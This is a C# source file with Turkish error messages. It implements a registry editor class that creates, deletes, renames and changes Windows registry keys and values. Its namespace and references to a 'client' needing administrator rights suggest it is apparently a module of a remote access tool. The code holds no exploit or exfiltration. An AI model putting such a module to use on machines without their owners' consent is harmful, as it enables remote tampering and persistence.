using System;
using Microsoft.Win32;
using xClient.KuuhakuÇekirdek.Eklentiler;

namespace xClient.KuuhakuÇekirdek.KayıtDefteri
{
    public class RegistryEditor
    {
        public static RegistryKey GetWritableRegistryKey(string keyPath)
        {
            RegistryKey key = RegistrySeeker.GetRootKey(keyPath);

            if (key != null)
            {
                if (key.Name != keyPath)
                {
                    string subKeyName = keyPath.Substring(key.Name.Length + 1);

                    key = key.OpenWritableSubKeySafe(subKeyName);
                }
            }

            return key;
        }

        #region SabitDeğerler

        #region RegistryKey

        private const string REGISTRY_KEY_CREATE_ERROR = "Anahtar oluşturulamadı: Kayıt defterine yazmada hata";

        private const string REGISTRY_KEY_DELETE_ERROR = "Anahtar silinemedi: Kayıt defterine yazmada hata";

        private const string REGISTRY_KEY_RENAME_ERROR = "Anahtar adı değiştirilemedi: Kayıt defterine yazmada hata";

        #endregion

        #region RegistryValue

        private const string REGISTRY_VALUE_CREATE_ERROR = "Anahtar oluşturulamadı: Kayıt defterine yazmada hata";

        private const string REGISTRY_VALUE_DELETE_ERROR = "Anahtar silinemedi: Kayıt defterine yazmada hata";

        private const string REGISTRY_VALUE_RENAME_ERROR = "Anahtar adı değiştirilemedi: Kayıt defterine yazmada hata";

        private const string REGISTRY_VALUE_CHANGE_ERROR = "Anahtar değiştirilemedi: Kayıt defterine yazmada hata";

        #endregion

        #endregion

        #region RegistryKey

        public static bool CreateRegistryKey(string parentPath, out string name, out string errorMsg)
        {
            name = "";
            try
            {
                var parent = GetWritableRegistryKey(parentPath);


                if (parent == null)
                {
                    errorMsg = "Bu kayıdı açmak için izniniz yoktur: " + parentPath +
                               ", clientin yönetici olarak çalıştırılması gerekiyor.";
                    return false;
                }

                int i = 1;
                string testName = string.Format("Yeni Anahtar #{0}", i);

                while (parent.ContainsSubKey(testName))
                {
                    i++;
                    testName = string.Format("Yeni Anahtar #{0}", i);
                }
                name = testName;

                using (RegistryKey child = parent.CreateSubKeySafe(name))
                {
                    if (child == null)
                    {
                        errorMsg = REGISTRY_KEY_CREATE_ERROR;
                        return false;
                    }
                }
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        public static bool DeleteRegistryKey(string name, string parentPath, out string errorMsg)
        {
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);

                if (parent == null)
                {
                    errorMsg = "Bu kayıdı açmak için izniniz yoktur: " + parentPath +
                               ", clientin yönetici olarak çalıştırılması gerekiyor.";
                    return false;
                }

                if (!parent.ContainsSubKey(name))
                {
                    errorMsg = "Bu kayıt: " + name + " bu dizinde bulunmamaktadır: " + parentPath;
                    return true;
                }

                var success = parent.DeleteSubKeyTreeSafe(name);

                if (!success)
                {
                    errorMsg = REGISTRY_KEY_DELETE_ERROR;
                    return false;
                }

                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        public static bool RenameRegistryKey(string oldName, string newName, string parentPath, out string errorMsg)
        {
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);

                if (parent == null)
                {
                    errorMsg = "Bu kayıdı açmak için izniniz yoktur: " + parentPath +
                               ", clientin yönetici olarak çalıştırılması gerekiyor.";
                    return false;
                }

                if (!parent.ContainsSubKey(oldName))
                {
                    errorMsg = "Bu kayıt " + oldName + " bu dizinde bulunmamaktadır: " + parentPath;
                    return false;
                }

                bool success = parent.RenameSubKeySafe(oldName, newName);

                if (!success)
                {
                    errorMsg = REGISTRY_KEY_RENAME_ERROR;
                    return false;
                }

                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        #endregion

        #region RegistryValue

        public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name,
            out string errorMsg)
        {
            name = "";
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);
                if (key == null)
                {
                    errorMsg = "Bu kayıdı açmak için izniniz yoktur: " + keyPath +
                               ", clientin yönetici olarak çalıştırılması gerekiyor.";
                    return false;
                }

                int i = 1;
                string testName = string.Format("Yeni Değer #{0}", i);

                while (key.ContainsValue(testName))
                {
                    i++;
                    testName = string.Format("Yeni Değer #{0}", i);
                }
                name = testName;

                bool success = key.SetValueSafe(name, kind.GetDefault(), kind);

                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_CREATE_ERROR;
                    return false;
                }

                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        public static bool DeleteRegistryValue(string keyPath, string name, out string errorMsg)
        {
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                if (key == null)
                {
                    errorMsg = "Bu kayıdı açmak için izniniz yoktur: " + keyPath +
                               ", clientin yönetici olarak çalıştırılması gerekiyor.";
                    return false;
                }

                if (!key.ContainsValue(name))
                {
                    errorMsg = "Değer: " + name + " bu dizinde bulunmamaktadır: " + keyPath;
                    return true;
                }

                bool success = key.DeleteValueSafe(name);
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_DELETE_ERROR;
                    return false;
                }

                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        public static bool RenameRegistryValue(string oldName, string newName, string keyPath, out string errorMsg)
        {
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                if (key == null)
                {
                    errorMsg = "Bu kayıdı açmak için izniniz yoktur: " + keyPath +
                               ", clientin yönetici olarak çalıştırılması gerekiyor.";
                    return false;
                }
                if (!key.ContainsValue(oldName))
                {
                    errorMsg = "Değer: " + oldName + " bu dizinde bulunmamaktadır: " + keyPath;
                    return false;
                }

                bool success = key.RenameValueSafe(oldName, newName);

                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_RENAME_ERROR;
                    return false;
                }

                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        public static bool ChangeRegistryValue(RegValueData value, string keyPath, out string errorMsg)
        {
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                if (key == null)
                {
                    errorMsg = "Bu kayıdı açmak için izniniz yoktur: " + keyPath +
                               ", clientin yönetici olarak çalıştırılması gerekiyor.";
                    return false;
                }

                if (!key.ContainsValue(value.Name))
                {
                    errorMsg = "Değer: " + value.Name + " bu dizinde bulunmamaktadır: " + keyPath;
                    return false;
                }

                bool success = key.SetValueSafe(value.Name, value.Data, value.Kind);

                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_CHANGE_ERROR;
                    return false;
                }

                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        #endregion
    }
}